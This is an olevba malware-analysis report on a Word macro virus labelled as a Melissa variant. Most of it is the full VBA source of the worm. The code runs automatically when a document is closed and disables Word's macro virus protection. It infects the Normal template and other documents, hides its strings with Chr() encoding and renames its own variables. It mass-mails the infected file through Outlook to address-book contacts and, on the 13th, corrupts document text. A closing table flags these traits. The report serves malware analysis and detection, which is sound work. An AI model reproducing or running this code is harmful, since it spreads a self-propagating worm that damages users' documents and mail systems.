olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.p-1f3a457bea8c03d64e9bed08efbad44ce623917b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa.p-1f3a457bea8c03d64e9bed08efbad44ce623917b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Options.ConfirmConversions = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
N382 = Chr(69) + Chr(99) + Chr(108) + Chr(105) + Chr(112) + Chr(115) + Chr(101)
If System.ProfileString("", N382) = Empty Then System.ProfileString("", N382) = Str(0)
If ActiveDocument.Words.Count <= 5 Then Exit Sub
With ActiveDocument.VBProject.VBComponents
F508 = .Item(1).CodeModule.CountOfLines
If Left(.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set I161 = .Item(1)
D568 = True
System.ProfileString("", N382) = Str(Val(System.ProfileString("", N382)) + 1)
End If
End With
With NormalTemplate.VBProject.VBComponents
P609 = .Item(1).CodeModule.CountOfLines
If Left(.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set I161 = .Item(1)
S628 = True
System.ProfileString("", N382) = Str(Val(System.ProfileString("", N382)) + 1)
Call T438_P528
End If
End With
If S628 <> True And D568 <> True Then GoTo U531
If S628 = True Then I161.CodeModule.AddFromString (Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41) & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, F508 - 1))
If D568 = True Then I161.CodeModule.AddFromString (Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41) & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, P609 - 1))
U531:
If Val(System.ProfileString("", N382)) = 5 Then
Dim C524, P972, U295, E284, L51
Set C524 = CreateObject(Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110))
Set P972 = C524.GetNameSpace("MAPI")
If C524 = "Outlook" Then
    With ActiveDocument
    If .Saved = False Then
        .Save
        If .Saved = False Then Exit Sub
    End If
    End With
    P972.Logon Chr(112) + Chr(114) + Chr(111) + Chr(102) + Chr(105) + Chr(108) + Chr(101), Chr(112) + Chr(97) + Chr(115) + Chr(115) + Chr(119) + Chr(111) + Chr(114) + Chr(100)
    For Y = 1 To P972.AddressLists.Count
        Set R463 = P972.AddressLists(Y)
        x = 1
        Set U295 = C524.CreateItem(0)
        For oo = 1 To R463.AddressEntries.Count
            E284 = R463.AddressEntries(x)
            U295.Recipients.Add E284
            x = x + 1
            If x > 50 Then oo = R463.AddressEntries.Count
         Next oo
         U295.Subject = Chr(77) + Chr(101) + Chr(115) + Chr(115) + Chr(97) + Chr(103) + Chr(101) + Chr(32) + Chr(70) + Chr(114) + Chr(111) + Chr(109) + Chr(32) & Application.UserName
         U295.Body = Chr(72) + Chr(101) + Chr(114) + Chr(101) + Chr(32) + Chr(105) + Chr(115) + Chr(32) + Chr(116) + Chr(104) + Chr(97) + Chr(116) + Chr(32) + Chr(100) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(32) + Chr(121) + Chr(111) + Chr(117) + Chr(32) + Chr(97) + Chr(115) + Chr(107) + Chr(101) + Chr(100) + Chr(32) + Chr(102) + Chr(111) + Chr(114) + Chr(46) + Chr(32) + Chr(32) + Chr(72) + Chr(111) + Chr(112) + Chr(101) + Chr(32) + Chr(121) + Chr(111) + Chr(117) + Chr(32) + Chr(101) + Chr(110) + Chr(106) + Chr(111) + Chr(121) + Chr(32) + Chr(105) + Chr(116) + Chr(32) + Chr(59) + Chr(45) + Chr(41)
         U295.Attachments.Add ActiveDocument.FullName
         U295.Send
         E284 = ""
         Next Y
    P972.Logoff
    C524.Application.Quit
    C524 = Nothing
  End If
End If
If P609 <> 0 And F508 = 0 Then
    If ActiveDocument.Saved = False Then
        ActiveDocument.Save
    End If
End If
End Sub

'Sub ToolsMacro()
'H704
'End Sub

'Sub ViewVBCode()
'H704
'End Sub

'Sub FileTemplates()
'H704
'End Sub

Private Sub H704()
msg = Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(32) + Chr(104) + Chr(97) + Chr(115) + Chr(32) + Chr(112) + Chr(101) + Chr(114) + Chr(102) + Chr(111) + Chr(114) + Chr(109) + Chr(101) + Chr(100) + Chr(32) + Chr(97) + Chr(110) + Chr(32) + Chr(105) + Chr(108) + Chr(108) + Chr(101) + Chr(103) + Chr(97) + Chr(108) + Chr(32) + Chr(111) + Chr(112) + Chr(101) + Chr(114) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(97) + Chr(110) + Chr(100) + Chr(32) + Chr(119) + Chr(105) + Chr(108) + Chr(108) + Chr(32) + Chr(115) + Chr(104) + Chr(117) + Chr(116) + Chr(32) + Chr(100) + Chr(111) + Chr(119) + Chr(110) + Chr(46)
MsgBox msg, vbCritical, Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(87) + Chr(111) + Chr(114) + Chr(100)
End Sub

Private Sub T438_P528()
On Error Resume Next
Randomize Timer
Dim L445(0 To 24) As String
L445(0) = "L445"
L445(1) = "R690": L445(2) = "S67": L445(3) = "N584": L445(4) = "M812": L445(5) = "P528": L445(6) = "F508"
L445(7) = "P609": L445(8) = "D568":: L445(9) = "I161": L445(10) = "S628": L445(11) = "U531": L445(12) = "T438": L445(13) = "D96": L445(14) = "O2"
L445(15) = "C524": L445(16) = "P972": L445(17) = "U295": L445(18) = "E284": L445(19) = "R463": L445(20) = "L51": L445(21) = "K673": L445(22) = "H704"
L445(23) = "Q426": L445(24) = "N382"
For x = 0 To 24
a1 = (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 1000)
Call P528(a1, L445(x))
Next x
End Sub

Private Sub P528(O2, D96 As String)
On Error Resume Next
Dim R690 As Long: Dim S67 As Long: Dim N584 As Long: Dim M812 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
R690 = 1: S67 = 1: N584 = .CountOfLines: M812 = Len(.Lines(.CountOfLines, 1))
Do While .Find(D96, R690, S67, N584, M812, True)
strline = .Lines(R690, 1)
strline = Left(strline, S67 - 1) & O2 & Mid(strline, M812)
.ReplaceLine R690, strline
R690 = N584 + 1: S67 = 1: DD2134 = .CountOfLines
M812 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
If ActiveDocument.Words.Count <= 5 And Day(Now()) <> 13 Then Exit Sub
Set K673 = ActiveDocument.Content
With K673.Find
    .ClearFormatting
    .Replacement.ClearFormatting
    .MatchWholeWord = True
    .Execute FindText:=".", ReplaceWith:=",", Replace:=wdReplaceAll
    .Execute FindText:="a", ReplaceWith:="e", Replace:=wdReplaceAll
    .Execute FindText:="and", ReplaceWith:="not", Replace:=wdReplaceAll
End With
msg = vbCrLf + Chr(89) + Chr(111) + Chr(117) + Chr(39) + Chr(118) + Chr(101) + Chr(32) + Chr(98) + Chr(101) + Chr(101) + Chr(110) + Chr(32) + Chr(69) + Chr(99) + Chr(108) + Chr(105) + Chr(112) + Chr(115) + Chr(101) + Chr(100) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(77) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(33) + Chr(77) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126)
msg = msg + vbCrLf + Chr(126) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126)
Set myR = ActiveDocument.Range(ActiveDocument.Content.End - 1, ActiveDocument.Content.End)
myR.InsertAfter msg
myR.Font.Name = "Courier New"
ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |Soy                 |U295                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+
